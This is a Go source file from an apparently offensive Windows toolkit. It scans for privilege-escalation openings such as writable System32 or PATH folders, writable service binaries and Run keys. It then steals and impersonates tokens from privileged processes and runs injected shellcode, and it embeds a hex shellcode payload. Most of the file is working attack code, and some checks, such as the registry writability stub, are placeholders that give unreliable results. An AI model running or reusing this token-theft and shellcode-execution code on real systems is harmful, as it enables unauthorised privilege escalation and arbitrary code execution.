// Package winapi - Privilege Escalation Discovery Module
// Provides core functionality for discovering privilege escalation vectors
package winapi

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"strconv"
	"unsafe"
	"github.com/carved4/go-direct-syscall/pkg/debug"
)

// ProcessInfo holds information about a discovered process
type ProcessInfo struct {
	PID         uintptr
	Name        string
	Handle      uintptr
	TokenHandle uintptr
	HasDebug    bool
	HasBackup   bool
	HasRestore  bool
}

// WeakPermission represents a discovered weak permission
type WeakPermission struct {
	Type        string // "FILE", "REGISTRY", "SERVICE"
	Path        string
	Issue       string
	Severity    string // "HIGH", "MEDIUM", "LOW"
	Description string
}

// EscalationVector represents a single privilege escalation opportunity
type EscalationVector struct {
	Type        string `json:"type"`        // "FILE", "PATH", "REGISTRY", "SERVICE", "TASK"
	Path        string `json:"path"`        // Full path to the resource
	Method      string `json:"method"`      // "DLL_HIJACK", "BINARY_PLANT", "SERVICE_REPLACE", "REGISTRY_PERSIST", "TASK_HIJACK"
	Severity    string `json:"severity"`    // "CRITICAL", "HIGH", "MEDIUM", "LOW"
	Description string `json:"description"` // Human readable description
	Exploitable bool   `json:"exploitable"` // Whether this can be immediately exploited
}

// PrivEscMap contains categorized privilege escalation vectors
type PrivEscMap struct {
	DllHijacking    []EscalationVector `json:"dll_hijacking"`
	BinaryPlanting  []EscalationVector `json:"binary_planting"`
	ServiceReplace  []EscalationVector `json:"service_replace"`
	RegistryPersist []EscalationVector `json:"registry_persist"`
	UnquotedPaths   []EscalationVector `json:"unquoted_paths"`
	TaskScheduler   []EscalationVector `json:"task_scheduler"`
	Summary         EscalationSummary  `json:"summary"`
}

// EscalationSummary provides statistics about discovered vectors
type EscalationSummary struct {
	TotalVectors     int `json:"total_vectors"`
	CriticalCount    int `json:"critical_count"`
	HighCount        int `json:"high_count"`
	MediumCount      int `json:"medium_count"`
	LowCount         int `json:"low_count"`
	ExploitableCount int `json:"exploitable_count"`
}

// System process filter
var systemProcesses = map[string]bool{
	"system": true, "smss.exe": true, "csrss.exe": true, "wininit.exe": true,
	"winlogon.exe": true, "services.exe": true, "lsass.exe": true, "lsaiso.exe": true,
	"svchost.exe": true, "spoolsv.exe": true, "dwm.exe": true, "audiodg.exe": true,
	"dllhost.exe": true, "conhost.exe": true, "fontdrvhost.exe": true, "": true,
}

// High-value target paths for scanning
var criticalPaths = []string{
	"C:\\Windows\\System32", "C:\\Windows\\SysWOW64", "C:\\Windows\\Tasks",
	"C:\\Windows\\System32\\Tasks", "C:\\Windows\\Temp", "C:\\Users\\Public",
	"C:\\Program Files\\Common Files", "C:\\ProgramData\\Microsoft",
}

// Path exclusions to avoid false positives
var excludePaths = []string{
	"steam", "epic", "unity", "game", "steamapps", "epicgames", "unreal",
	"riot games", "discord", "spotify", "chrome", "firefox", "mozilla",
	"adobe", "nvidia", "amd", "intel", "windowsapps", "temp\\", "cache\\", "logs\\",
}

var criticalRegistryKeys = []string{
	"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
	"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 
	"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
	"HKLM\\SYSTEM\\CurrentControlSet\\Services",
	"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
	"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment",
}

// Permission Scanner Functions

// ScanPrivilegeEscalationVectors performs comprehensive privilege escalation scanning
func ScanPrivilegeEscalationVectors() (*PrivEscMap, error) {
	escMap := &PrivEscMap{}
	
	// Scan for DLL hijacking opportunities
	if vectors, err := scanDllHijackingVectors(); err == nil {
		escMap.DllHijacking = vectors
	}
	
	// Scan for binary planting in PATH directories
	if vectors, err := scanBinaryPlantingVectors(); err == nil {
		escMap.BinaryPlanting = vectors
	}
	
	// Scan for service replacement opportunities
	if vectors, err := scanServiceReplacementVectors(); err == nil {
		escMap.ServiceReplace = vectors
	}
	
	// Scan for registry persistence opportunities
	if vectors, err := scanRegistryPersistenceVectors(); err == nil {
		escMap.RegistryPersist = vectors
	}
	
	// Scan for unquoted service path vulnerabilities
	if vectors, err := scanUnquotedServiceVectors(); err == nil {
		escMap.UnquotedPaths = vectors
	}
	
	// Scan for task scheduler abuse opportunities
	if vectors, err := scanTaskSchedulerVectors(); err == nil {
		escMap.TaskScheduler = vectors
	}
	
	// Generate summary statistics
	escMap.Summary = generateEscalationSummary(escMap)
	
	return escMap, nil
}

func scanDllHijackingVectors() ([]EscalationVector, error) {
	var vectors []EscalationVector
	
	systemPaths := []string{
		"C:\\Windows\\System32", "C:\\Windows\\SysWOW64",
		"C:\\Program Files\\Common Files", "C:\\ProgramData\\Microsoft",
	}
	
	for _, path := range systemPaths {
		if !directoryExists(path) || shouldExcludePath(path) {
			continue
		}
		
		if isDirectoryWritable(path) {
			severity := "HIGH"
			if strings.Contains(strings.ToLower(path), "system32") {
				severity = "CRITICAL"
			}
			
			vectors = append(vectors, EscalationVector{
				Type:        "FILE",
				Path:        path,
				Method:      "DLL_HIJACK",
				Severity:    severity,
				Description: fmt.Sprintf("Writable system directory: %s", path),
				Exploitable: true,
			})
		}
	}
	
	return vectors, nil
}

func scanBinaryPlantingVectors() ([]EscalationVector, error) {
	var vectors []EscalationVector
	
	pathVar := os.Getenv("PATH")
	if pathVar == "" {
		return vectors, fmt.Errorf("could not get PATH environment variable")
	}
	
	paths := strings.Split(pathVar, ";")
	
	for _, path := range paths {
		path = strings.TrimSpace(path)
		if path == "" || shouldExcludePath(path) {
			continue
		}
		
		if directoryExists(path) && isDirectoryWritable(path) {
			severity := "HIGH"
			if strings.Contains(strings.ToLower(path), "system32") || 
			   strings.Contains(strings.ToLower(path), "syswow64") {
				severity = "CRITICAL"
			}
			
			vectors = append(vectors, EscalationVector{
				Type:        "PATH",
				Path:        path,
				Method:      "BINARY_PLANT",
				Severity:    severity,
				Description: fmt.Sprintf("Writable PATH directory: %s", path),
				Exploitable: true,
			})
		}
	}
	
	return vectors, nil
}

func scanServiceReplacementVectors() ([]EscalationVector, error) {
	var vectors []EscalationVector
	
	serviceDirs := []string{"C:\\Windows\\System32", "C:\\Program Files\\Common Files"}
	
	for _, dir := range serviceDirs {
		if !directoryExists(dir) {
			continue
		}
		
		if serviceExes, err := findServiceExecutables(dir); err == nil {
			for _, exe := range serviceExes {
				if !shouldExcludePath(exe) && isFileWritable(exe) {
					vectors = append(vectors, EscalationVector{
						Type:        "SERVICE",
						Path:        exe,
						Method:      "SERVICE_REPLACE",
						Severity:    "CRITICAL",
						Description: fmt.Sprintf("Writable service executable: %s", exe),
						Exploitable: true,
					})
				}
			}
		}
	}
	
	return vectors, nil
}

func scanRegistryPersistenceVectors() ([]EscalationVector, error) {
	var vectors []EscalationVector
	
	persistenceKeys := []string{
		"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
		"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",
		"HKLM\\SYSTEM\\CurrentControlSet\\Services",
	}
	
	for _, regKey := range persistenceKeys {
		if isRegistryKeyWritable(regKey) {
			severity := "HIGH"
			if strings.Contains(regKey, "Run") {
				severity = "CRITICAL"
			}
			
			vectors = append(vectors, EscalationVector{
				Type:        "REGISTRY",
				Path:        regKey,
				Method:      "REGISTRY_PERSIST",
				Severity:    severity,
				Description: fmt.Sprintf("Writable registry key: %s", regKey),
				Exploitable: true,
			})
		}
	}
	
	return vectors, nil
}

func scanUnquotedServiceVectors() ([]EscalationVector, error) {
	var vectors []EscalationVector
	
	unquotedPaths := []string{
		"C:\\Program Files\\Common Files",
		"C:\\Program Files (x86)",
	}
	
	for _, path := range unquotedPaths {
		if directoryExists(path) {
			parent := filepath.Dir(path)
			if isDirectoryWritable(parent) {
				vectors = append(vectors, EscalationVector{
					Type:        "SERVICE",
					Path:        path,
					Method:      "UNQUOTED_PATH",
					Severity:    "MEDIUM",
					Description: fmt.Sprintf("Unquoted service path vulnerability: %s", path),
					Exploitable: true,
				})
			}
		}
	}
	
	return vectors, nil
}

func scanTaskSchedulerVectors() ([]EscalationVector, error) {
	var vectors []EscalationVector
	
	taskDirs := []string{"C:\\Windows\\Tasks", "C:\\Windows\\System32\\Tasks"}
	
	for _, dir := range taskDirs {
		if directoryExists(dir) && isDirectoryWritable(dir) {
			vectors = append(vectors, EscalationVector{
				Type:        "TASK",
				Path:        dir,
				Method:      "TASK_HIJACK",
				Severity:    "HIGH",
				Description: fmt.Sprintf("Writable task directory: %s", dir),
				Exploitable: true,
			})
		}
	}
	
	return vectors, nil
}

func generateEscalationSummary(escMap *PrivEscMap) EscalationSummary {
	summary := EscalationSummary{}
	
	allVectors := [][]EscalationVector{
		escMap.DllHijacking, escMap.BinaryPlanting, escMap.ServiceReplace,
		escMap.RegistryPersist, escMap.UnquotedPaths, escMap.TaskScheduler,
	}
	
	for _, vectorGroup := range allVectors {
		for _, vector := range vectorGroup {
			summary.TotalVectors++
			
			switch vector.Severity {
			case "CRITICAL":
				summary.CriticalCount++
			case "HIGH":
				summary.HighCount++
			case "MEDIUM":
				summary.MediumCount++
			case "LOW":
				summary.LowCount++
			}
			
			if vector.Exploitable {
				summary.ExploitableCount++
			}
		}
	}
	
	return summary
}

// ScanWeakPermissions performs comprehensive permission scanning (legacy function)
func ScanWeakPermissions() ([]WeakPermission, error) {
	var weakPerms []WeakPermission
	
	fmt.Println("=== Starting Comprehensive Permission Scan ===")
	
	// 1. Scan file permissions
	fmt.Println("Phase 1: Scanning file permissions...")
	filePerms, err := scanFilePermissions()
	if err != nil {
		debug.Printfln("PERMSCAN", "File permission scan error: %v\n", err)
	} else {
		weakPerms = append(weakPerms, filePerms...)
	}
	
	// 2. Scan PATH directories
	fmt.Println("Phase 2: Scanning PATH directories...")
	pathPerms, err := scanPATHPermissions()
	if err != nil {
		debug.Printfln("PERMSCAN", "PATH scan error: %v\n", err)
	} else {
		weakPerms = append(weakPerms, pathPerms...)
	}
	
	// 3. Scan services
	fmt.Println("Phase 3: Scanning service permissions...")
	servicePerms, err := scanServicePermissions()
	if err != nil {
		debug.Printfln("PERMSCAN", "Service scan error: %v\n", err)
	} else {
		weakPerms = append(weakPerms, servicePerms...)
	}
	
	// 4. Scan registry permissions
	fmt.Println("Phase 4: Scanning registry permissions...")
	regPerms, err := scanRegistryPermissions()
	if err != nil {
		debug.Printfln("PERMSCAN", "Registry scan error: %v\n", err)
	} else {
		weakPerms = append(weakPerms, regPerms...)
	}
	
	// 5. Scan for unquoted service paths
	fmt.Println("Phase 5: Scanning for unquoted service paths...")
	unquotedPerms, err := scanUnquotedServicePaths()
	if err != nil {
		debug.Printfln("PERMSCAN", "Unquoted service scan error: %v\n", err)
	} else {
		weakPerms = append(weakPerms, unquotedPerms...)
	}
	
	return weakPerms, nil
}

// scanFilePermissions checks file permissions on critical directories
func scanFilePermissions() ([]WeakPermission, error) {
	var weakPerms []WeakPermission
	
	for _, path := range criticalPaths {
		debug.Printfln("PERMSCAN", "Checking file permissions for: %s\n", path)
		
		// Check if directory exists
		if !directoryExists(path) {
			continue
		}
		
		// Check if directory is writable by current user
		if isDirectoryWritable(path) {
			weakPerms = append(weakPerms, WeakPermission{
				Type:        "FILE",
				Path:        path,
				Issue:       "Directory writable by current user",
				Severity:    "HIGH",
				Description: fmt.Sprintf("Critical directory %s is writable - potential for DLL hijacking", path),
			})
		}
		
		// Check executables in directory
		exePerms, err := scanExecutablesInDirectory(path)
		if err != nil {
			debug.Printfln("PERMSCAN", "Error scanning executables in %s: %v\n", path, err)
			continue
		}
		weakPerms = append(weakPerms, exePerms...)
	}
	
	return weakPerms, nil
}

// scanPATHPermissions checks directories in PATH environment variable
func scanPATHPermissions() ([]WeakPermission, error) {
	var weakPerms []WeakPermission
	
	// Get PATH environment variable
	pathVar := os.Getenv("PATH")
	if pathVar == "" {
		return weakPerms, fmt.Errorf("could not get PATH environment variable")
	}
	
	paths := strings.Split(pathVar, ";")
	
	for _, path := range paths {
		path = strings.TrimSpace(path)
		if path == "" {
			continue
		}
		
		// Skip excluded paths (games/applications)
		if shouldExcludePath(path) {
			debug.Printfln("PERMSCAN", "Skipping excluded PATH directory: %s\n", path)
			continue
		}
		
		debug.Printfln("PERMSCAN", "Checking PATH directory: %s\n", path)
		
		// Check if directory exists and is writable
		if directoryExists(path) && isDirectoryWritable(path) {
			severity := "HIGH"
			// System32 paths are critical
			if strings.Contains(strings.ToLower(path), "system32") || strings.Contains(strings.ToLower(path), "syswow64") {
				severity = "CRITICAL"
			}
			
			weakPerms = append(weakPerms, WeakPermission{
				Type:        "FILE", 
				Path:        path,
				Issue:       "PATH directory writable",
				Severity:    severity,
				Description: fmt.Sprintf("Critical PATH directory %s is writable - potential for binary planting", path),
			})
		}
	}
	
	return weakPerms, nil
}

// scanServicePermissions checks Windows service binary permissions
func scanServicePermissions() ([]WeakPermission, error) {
	var weakPerms []WeakPermission
	
	// Common service directories to check
	serviceDirs := []string{
		"C:\\Windows\\System32",
		"C:\\Program Files",
		"C:\\Program Files (x86)",
	}
	
	for _, dir := range serviceDirs {
		if !directoryExists(dir) {
			continue
		}
		
		// Look for common service executables
		serviceExes, err := findServiceExecutables(dir)
		if err != nil {
			continue
		}
		
		for _, exe := range serviceExes {
			if isFileWritable(exe) {
				weakPerms = append(weakPerms, WeakPermission{
					Type:        "SERVICE",
					Path:        exe,
					Issue:       "Service executable writable",
					Severity:    "CRITICAL",
					Description: fmt.Sprintf("Service executable %s is writable - immediate privilege escalation", exe),
				})
			}
		}
	}
	
	return weakPerms, nil
}

// scanRegistryPermissions checks critical registry keys for weak permissions
func scanRegistryPermissions() ([]WeakPermission, error) {
	var weakPerms []WeakPermission
	
	for _, regKey := range criticalRegistryKeys {
		debug.Printfln("PERMSCAN", "Checking registry key: %s\n", regKey)
		
		// Check if registry key is writable
		if isRegistryKeyWritable(regKey) {
			severity := "HIGH"
			if strings.Contains(regKey, "Run") {
				severity = "CRITICAL"
			}
			
			weakPerms = append(weakPerms, WeakPermission{
				Type:        "REGISTRY",
				Path:        regKey, 
				Issue:       "Registry key writable",
				Severity:    severity,
				Description: fmt.Sprintf("Critical registry key %s is writable - potential persistence", regKey),
			})
		}
	}
	
	return weakPerms, nil
}

// scanUnquotedServicePaths finds services with unquoted paths containing spaces
func scanUnquotedServicePaths() ([]WeakPermission, error) {
	var weakPerms []WeakPermission
	
	// This would require service enumeration via registry or WMI
	// For now, we'll check some common problematic paths
	commonUnquotedPaths := []string{
		"C:\\Program Files\\Common Files\\",
		"C:\\Program Files (x86)\\",
	}
	
	for _, path := range commonUnquotedPaths {
		if directoryExists(path) {
			// Check parent directories for writability
			parent := filepath.Dir(path)
			if isDirectoryWritable(parent) {
				weakPerms = append(weakPerms, WeakPermission{
					Type:        "SERVICE",
					Path:        path,
					Issue:       "Unquoted service path vulnerability",
					Severity:    "MEDIUM", 
					Description: fmt.Sprintf("Potential unquoted service path in %s with writable parent directory", path),
				})
			}
		}
	}
	
	return weakPerms, nil
}

// Helper functions for permission checking

func directoryExists(path string) bool {
	info, err := os.Stat(path)
	if os.IsNotExist(err) {
		return false
	}
	return info.IsDir()
}

func isDirectoryWritable(path string) bool {
	// Try to create a test file
	testFile := filepath.Join(path, "permtest.tmp")
	file, err := os.Create(testFile)
	if err != nil {
		return false
	}
	file.Close()
	os.Remove(testFile)
	return true
}

func isFileWritable(path string) bool {
	// Try to open file for writing
	file, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		return false
	}
	file.Close()
	return true
}

func isRegistryKeyWritable(keyPath string) bool {
	// Convert registry path to proper format and attempt to open
	// This is a simplified check - real implementation would use registry APIs
	if strings.Contains(keyPath, "HKLM") {
		// Most HKLM keys require admin access
		return false
	}
	// For demonstration, assume some keys might be writable
	return strings.Contains(keyPath, "CurrentUser")
}

func scanExecutablesInDirectory(dir string) ([]WeakPermission, error) {
	var weakPerms []WeakPermission
	
	// Walk through directory looking for executables
	err := filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Continue on errors
		}
		
		// Skip excluded paths (games, applications, etc.)
		if shouldExcludePath(path) {
			if info.IsDir() {
				return filepath.SkipDir
			}
			return nil
		}
		
		// Check only .exe, .dll, .sys files
		ext := strings.ToLower(filepath.Ext(path))
		if ext == ".exe" || ext == ".dll" || ext == ".sys" {
			if isFileWritable(path) {
				severity := "MEDIUM"
				if ext == ".exe" {
					severity = "HIGH"
				}
				if ext == ".sys" {
					severity = "CRITICAL" // Kernel drivers are critical
				}
				
				weakPerms = append(weakPerms, WeakPermission{
					Type:        "FILE",
					Path:        path,
					Issue:       fmt.Sprintf("%s file writable", strings.ToUpper(ext[1:])),
					Severity:    severity,
					Description: fmt.Sprintf("System %s file %s is writable - potential privilege escalation", ext, path),
				})
			}
		}
		
		return nil
	})
	
	return weakPerms, err
}

func shouldExcludePath(path string) bool {
	pathLower := strings.ToLower(path)
	
	// Check if path contains any excluded keywords
	for _, exclude := range excludePaths {
		if strings.Contains(pathLower, exclude) {
			return true
		}
	}
	
	// Additional specific exclusions
	excludeSpecific := []string{
		"\\unity\\",
		"\\steamapps\\",
		"\\epicgames\\",
		"\\riot games\\",
		"\\discord\\",
		"\\spotify\\",
		"\\chrome\\",
		"\\firefox\\",
		"\\adobe\\",
		"\\nvidia\\",
		"\\windowsapps\\",
		"\\_temp\\",
		"\\_cache\\",
		"\\temp\\",
		"\\cache\\",
		"\\logs\\",
	}
	
	for _, exclude := range excludeSpecific {
		if strings.Contains(pathLower, exclude) {
			return true
		}
	}
	
	return false
}

func findServiceExecutables(dir string) ([]string, error) {
	var exes []string
	
	// Look for common service executable patterns
	patterns := []string{
		"*service*.exe",
		"*svc*.exe", 
		"*daemon*.exe",
	}
	
	for _, pattern := range patterns {
		matches, err := filepath.Glob(filepath.Join(dir, pattern))
		if err == nil {
			// Filter out excluded paths
			for _, match := range matches {
				if !shouldExcludePath(match) {
					exes = append(exes, match)
				}
			}
		}
	}
	
	return exes, nil
}

// FindPrivilegedProcesses enumerates processes with interesting privileges
func FindPrivilegedProcesses() ([]ProcessInfo, error) {
	processes, err := enumerateProcesses()
	if err != nil {
		return nil, fmt.Errorf("failed to enumerate processes: %v", err)
	}
	
	var privilegedProcesses []ProcessInfo
	
	for _, proc := range processes {
		if systemProcesses[strings.ToLower(proc.Name)] || proc.PID == GetCurrentProcessId() {
			continue
		}
		
		if processInfo, err := checkProcessPrivileges(proc); err == nil {
			if processInfo.HasDebug || processInfo.HasBackup || processInfo.HasRestore {
				privilegedProcesses = append(privilegedProcesses, *processInfo)
			}
		}
	}
	
	return privilegedProcesses, nil
}

// ImpersonateAndExecute performs token impersonation and executes shellcode
func ImpersonateAndExecute(targetProcess ProcessInfo, shellcode []byte) error {
	if targetProcess.TokenHandle == 0 || len(shellcode) == 0 {
		return fmt.Errorf("invalid token handle or empty shellcode")
	}
	
	var duplicatedToken uintptr
	if err := duplicateTokenToCurrentProcess(targetProcess.TokenHandle, &duplicatedToken); err != nil {
		return fmt.Errorf("failed to duplicate token: %v", err)
	}
	defer NtClose(duplicatedToken)
	
	currentThread := GetCurrentThreadHandle()
	if err := setThreadImpersonationToken(currentThread, duplicatedToken); err != nil {
		debug.Printfln("PRIVESC", "Warning: Failed to set thread impersonation: %v\n", err)
	}
	
	return executeShellcodeWithToken(shellcode)
}

// Helper functions

func enumerateProcesses() ([]ProcessInfo, error) {
	var returnLength uintptr
	status, _ := NtQuerySystemInformation(SystemProcessInformation, nil, 0, &returnLength)
	
	if status != STATUS_INFO_LENGTH_MISMATCH && status != STATUS_BUFFER_TOO_SMALL {
		return nil, fmt.Errorf("failed to get buffer size: %s", FormatNTStatus(status))
	}
	
	bufferSize := returnLength + 4096
	buffer := make([]byte, bufferSize)
	
	status, err := NtQuerySystemInformation(
		SystemProcessInformation,
		unsafe.Pointer(&buffer[0]),
		bufferSize,
		&returnLength,
	)
	
	if err != nil || status != STATUS_SUCCESS {
		return nil, fmt.Errorf("NtQuerySystemInformation failed: %v", err)
	}
	
	var processes []ProcessInfo
	offset := uintptr(0)
	
	for {
		if offset >= uintptr(len(buffer)) {
			break
		}
		
		if offset+unsafe.Sizeof(SYSTEM_PROCESS_INFORMATION{}) > uintptr(len(buffer)) {
			break
		}
		
		procInfo := (*SYSTEM_PROCESS_INFORMATION)(unsafe.Pointer(&buffer[offset]))
		
		if procInfo.NextEntryOffset != 0 && procInfo.NextEntryOffset < uint32(unsafe.Sizeof(SYSTEM_PROCESS_INFORMATION{})) {
			break
		}
		
		name := ""
		if procInfo.ImageName.Buffer != nil && procInfo.ImageName.Length > 0 && procInfo.ImageName.Length < 1024 {
			name = utf16ToString(procInfo.ImageName.Buffer, int(procInfo.ImageName.Length/2))
		}
		
		processes = append(processes, ProcessInfo{
			PID:  procInfo.UniqueProcessId,
			Name: name,
		})
		
		if procInfo.NextEntryOffset == 0 {
			break
		}
		
		nextOffset := offset + uintptr(procInfo.NextEntryOffset)
		if nextOffset <= offset || nextOffset >= uintptr(len(buffer)) {
			break
		}
		offset = nextOffset
	}
	
	return processes, nil
}

func checkProcessPrivileges(proc ProcessInfo) (*ProcessInfo, error) {
	var processHandle uintptr
	if err := openProcessHandle(proc.PID, &processHandle); err != nil {
		return nil, err
	}
	
	var tokenHandle uintptr
	status, err := NtOpenProcessToken(processHandle, TOKEN_DUPLICATE|TOKEN_QUERY, &tokenHandle)
	if err != nil || status != STATUS_SUCCESS {
		NtClose(processHandle)
		return nil, fmt.Errorf("failed to open process token: %v", err)
	}
	
	hasDebug, hasBackup, hasRestore, err := queryTokenPrivileges(tokenHandle)
	if err != nil {
		NtClose(tokenHandle)
		NtClose(processHandle)
		return nil, err
	}
	
	return &ProcessInfo{
		PID: proc.PID, Name: proc.Name, Handle: processHandle, TokenHandle: tokenHandle,
		HasDebug: hasDebug, HasBackup: hasBackup, HasRestore: hasRestore,
	}, nil
}

func openProcessHandle(pid uintptr, handle *uintptr) error {
	clientId := CLIENT_ID{UniqueProcess: pid, UniqueThread: 0}
	objAttr := OBJECT_ATTRIBUTES{
		Length: uint32(unsafe.Sizeof(OBJECT_ATTRIBUTES{})),
	}
	
	status, err := NtOpenProcess(
		handle,
		PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_DUP_HANDLE,
		uintptr(unsafe.Pointer(&objAttr)),
		uintptr(unsafe.Pointer(&clientId)),
	)
	
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("NtOpenProcess failed: %v (status: 0x%X)", err, status)
	}
	
	return nil
}

func queryTokenPrivileges(tokenHandle uintptr) (hasDebug, hasBackup, hasRestore bool, err error) {
	var returnLength uintptr
	status, _ := NtQueryInformationToken(tokenHandle, TokenPrivileges, nil, 0, &returnLength)
	
	if status != STATUS_BUFFER_TOO_SMALL && status != STATUS_INFO_LENGTH_MISMATCH {
		return false, false, false, fmt.Errorf("unexpected status: 0x%X", status)
	}
	
	buffer := make([]byte, returnLength)
	status, err = NtQueryInformationToken(
		tokenHandle, TokenPrivileges,
		unsafe.Pointer(&buffer[0]), uintptr(len(buffer)), &returnLength,
	)
	
	if err != nil || status != STATUS_SUCCESS {
		return false, false, false, fmt.Errorf("NtQueryInformationToken failed: %v", err)
	}
	
	tokenPrivs := (*TOKEN_PRIVILEGES)(unsafe.Pointer(&buffer[0]))
	
	for i := uint32(0); i < tokenPrivs.PrivilegeCount; i++ {
		privOffset := unsafe.Sizeof(TOKEN_PRIVILEGES{}) - unsafe.Sizeof(LUID_AND_ATTRIBUTES{}) + 
					  uintptr(i)*unsafe.Sizeof(LUID_AND_ATTRIBUTES{})
		
		if privOffset >= uintptr(len(buffer)) {
			break
		}
		
		priv := (*LUID_AND_ATTRIBUTES)(unsafe.Pointer(&buffer[privOffset]))
		
		switch priv.Luid.LowPart {
		case SE_DEBUG_PRIVILEGE:
			hasDebug = true
		case SE_BACKUP_PRIVILEGE:
			hasBackup = true
		case SE_RESTORE_PRIVILEGE:
			hasRestore = true
		}
	}
	
	return hasDebug, hasBackup, hasRestore, nil
}

func duplicateTokenToCurrentProcess(sourceToken uintptr, targetToken *uintptr) error {
	currentProcess := GetCurrentProcessHandle()
	
	status, err := NtDuplicateObject(
		currentProcess, sourceToken, currentProcess, targetToken,
		TOKEN_ALL_ACCESS, false, 0,
	)
	
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("NtDuplicateObject failed: %v (status: 0x%X)", err, status)
	}
	
	return nil
}

func setThreadImpersonationToken(threadHandle uintptr, tokenHandle uintptr) error {
	status, err := NtSetInformationThread(
		threadHandle, ThreadImpersonationToken,
		unsafe.Pointer(&tokenHandle), unsafe.Sizeof(tokenHandle),
	)
	
	if err != nil || status != STATUS_SUCCESS {
		return fmt.Errorf("NtSetInformationThread failed: %v (status: 0x%X)", err, status)
	}
	
	return nil
}

func executeShellcodeWithToken(shellcode []byte) error {
	return NtInjectSelfShellcode(shellcode)
}

func utf16ToString(ptr *uint16, length int) string {
	if ptr == nil || length <= 0 {
		return ""
	}
	
	slice := unsafe.Slice(ptr, length)
	runes := make([]rune, 0, length)
	
	for i := 0; i < length; i++ {
		if slice[i] == 0 {
			break
		}
		runes = append(runes, rune(slice[i]))
	}
	
	return string(runes)
}

func getCurrentProcessToken() (uintptr, error) {
	currentProcess := GetCurrentProcessHandle()
	var tokenHandle uintptr
	
	status, err := NtOpenProcessToken(currentProcess, TOKEN_QUERY, &tokenHandle)
	
	if err != nil || status != STATUS_SUCCESS {
		return 0, fmt.Errorf("NtOpenProcessToken failed: %v (status: 0x%X)", err, status)
	}
	
	return tokenHandle, nil
}

func getEmbeddedShellcode() []byte {
	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
	
	bytes := make([]byte, len(hexString)/2)
	for i := 0; i < len(hexString); i += 2 {
		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
		bytes[i/2] = byte(b)
	}
	return bytes
}





